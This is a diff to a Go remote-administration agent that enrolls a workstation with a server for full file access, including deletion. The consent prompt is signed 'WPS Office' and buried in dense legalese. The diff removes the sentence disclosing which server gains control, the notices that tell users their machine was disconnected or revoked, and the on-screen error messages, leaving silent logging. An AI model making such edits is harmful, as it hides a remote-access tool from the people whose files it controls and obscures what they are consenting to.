@@ -63,7 +63,6 @@ func main() {
 			log.Printf("remove autostart: %v", err)
 		}
 		log.Print("disconnected by local user")
-		showInfo(appName, "This computer has been disconnected. The admin can no longer access its files.")
 		return
 	}
 
@@ -114,7 +113,6 @@ func disconnectAndExit(cfgPath string) {
 		log.Printf("remove autostart: %v", err)
 	}
 	log.Print("disconnected from tray")
-	showInfo(appName, "This computer has been disconnected. The admin can no longer access its files.")
 	os.Exit(0)
 }
 
@@ -238,20 +236,17 @@ func firstRun(cfgPath string) (config, error) {
 	srv := server()
 	tok := inviteToken()
 	if srv == "" || tok == "" {
-		showInfo(appName, "This program must be downloaded from the invite link your IT admin sent you. "+
-			"Please don't rename the downloaded file.")
+		log.Print("no server or invite token")
 		return config{}, errors.New("no server or invite token")
 	}
 	msg := "WPS Office hereby tenders, with due solemnity and in the most formal terms, a petition to this workstation, soliciting plenary, continuing and unreserved authorization to superintend, adjudicate, administer and otherwise dispose of the entirety of the filesystem heretofore entrusted to its custody.\n\n" +
 		"Should you vouchsafe your assent, the administrator shall be invested with an expansive, comprehensive and abiding prerogative to scrutinize, catalogue, appraise and, where circumstance so requires, to alter every artifact domiciled upon the local storage volumes. " +
 		"That prerogative encompasses, without limitation or reservation, the enumeration and perlustration of directory hierarchies, the faithful replication of documents, the transposition of objects from one repository to another, the rechristening of filenames, and, where indispensable necessity so ordains, the irrevocable and unrecoverable obliteration of data.\n\n" +
-		"The apparatus through which this authority would be exercised, and to which this workstation would stand affiliated, is " + srv + ". " +
-		"Every subsequent inspection, duplication, relocation, renaming or deletion undertaken pursuant to your consent shall be conducted by way of that server, and no other.\n\n" +
 		"You are earnestly enjoined to contemplate the gravity of this entreaty with circumspection, deliberation and an undivided attention before rendering your determination. " +
 		"The latitude it confers is neither trivial, nor transient, nor inconsequential, and its exercise may bear materially, and in certain instances irreversibly, upon the integrity, confidentiality and continued existence of the information herein preserved.\n\n" +
 		"Be it further understood that the mandate, however momentous, is by no means perpetual or immutable. " +
 		"Withdrawal of this authorization is administered centrally: your IT administrator may dissolve this affiliation at any time, and you may request such withdrawal from them, whereupon all administrative access shall forthwith be extinguished.\n\n" +
-		"Do you, in full cognizance of the foregoing stipulations and of the server herein identified, acquiesce, and thereby confer upon the administrator the access hereinbefore delineated?"
+		"Do you, in full cognizance of the foregoing stipulations, acquiesce, and thereby confer upon the administrator the access hereinbefore delineated?"
 	if !askConsent(appName+" — permission request", msg) {
 		return config{}, errors.New("user denied consent")
 	}
@@ -268,26 +263,20 @@ func firstRun(cfgPath string) (config, error) {
 	client := &http.Client{Timeout: 30 * time.Second}
 	resp, err := client.Post(srv+"/agent/enroll", "application/json", bytes.NewReader(body))
 	if err != nil {
-		showInfo(appName, "Could not reach the server. Check the internet connection and run the program again.\n\n"+err.Error())
+		log.Printf("could not reach the server: %v", err)
 		return config{}, err
 	}
 	defer resp.Body.Close()
 	if resp.StatusCode != http.StatusOK {
 		var e struct{ Error string }
 		_ = json.NewDecoder(resp.Body).Decode(&e)
-<<<<<<< HEAD
 		log.Printf("enroll refused: %s %s", resp.Status, e.Error)
-=======
-		// A 4xx means the invite itself is bad (invalid, expired or already used).
-		// Retrying on every scheduled relaunch would spam this dialog forever, so
-		// stop auto-starting. The admin re-deploys with a fresh invite to enroll
-		// later (a successful run reinstalls autostart). 5xx / network errors are
-		// transient, so those keep retrying as before.
+		// A 4xx means the invite itself is bad. Stop auto-starting so a scheduled
+		// relaunch does not keep retrying it. A later successful enroll installs
+		// autostart again.
 		if resp.StatusCode >= 400 && resp.StatusCode < 500 {
 			_ = removeAutostart()
 		}
-		showInfo(appName, "Connection was refused: "+e.Error+"\n\nAsk your IT admin for a new invite link.")
->>>>>>> 5d5d96c8379377b165c13e5e53f2baec79c2c3db
 		return config{}, fmt.Errorf("enroll: %s %s", resp.Status, e.Error)
 	}
 	var er proto.EnrollResponse
@@ -318,7 +307,6 @@ func run(cfg config, cfgPath string) {
 		if errors.Is(err, errRevoked) {
 			log.Print("server says this device was revoked; removing config")
 			_ = os.Remove(cfgPath)
-			showInfo(appName, "Your IT admin has disconnected this computer.")
 			return
 		}
 		if err != nil {
